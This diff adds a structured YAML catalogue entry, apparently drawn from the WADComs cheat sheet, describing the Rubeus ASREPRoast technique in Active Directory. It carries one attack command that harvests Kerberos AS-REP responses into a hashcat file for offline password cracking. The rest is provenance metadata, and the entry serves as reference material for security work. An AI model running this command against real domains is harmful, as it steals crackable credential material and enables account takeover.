@@ -1,0 +1,95 @@
+id: wadcoms/Rubeus-ASREPRoast
+type: technique
+platform: active-directory
+name: Rubeus ASREPRoast
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+- privilege-escalation
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- shell
+commands:
+- template: Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+  comment: "Rubeus' `asreproast` module will attempt to harvest the non-preauth AS_REP responses for a\
+    \ given list of usernames. These responses will be encrypted with the user's password, which can then\
+    \ be cracked offline. The following command is run on a Windows machine in the victim domain.\n\n\
+    Command Reference:\n\n\tOutput File: hashes.txt\n"
+references:
+- https://github.com/GhostPack/Rubeus
+- https://github.com/GhostPack/Rubeus#asreproast
+tags:
+- active-directory
+- wadcoms
+- kerberos
+source_data:
+  WADComs:
+    raw:
+      file: Rubeus-ASREPRoast.md
+      document: "---\ndescription: |\n  Rubeus' `asreproast` module will attempt to harvest the non-preauth\
+        \ AS_REP responses for a given list of usernames. These responses will be encrypted with the user's\
+        \ password, which can then be cracked offline. The following command is run on a Windows machine\
+        \ in the victim domain.\n\n  Command Reference:\n\n  \tOutput File: hashes.txt\n\ncommand: |\n\
+        \  Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt\nitems:\n  - Shell\nservices:\n \
+        \ - Kerberos\nOS:\n  - Windows\nattack_types:\n  - Exploitation\n  - PrivEsc\nreferences:\n  -\
+        \ https://github.com/GhostPack/Rubeus\n  - https://github.com/GhostPack/Rubeus#asreproast\n---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: PrivEsc'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: PrivEsc'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:747db85102b1c6ab1841ab320c09114e274dfae74690b5897325923db43d94c7
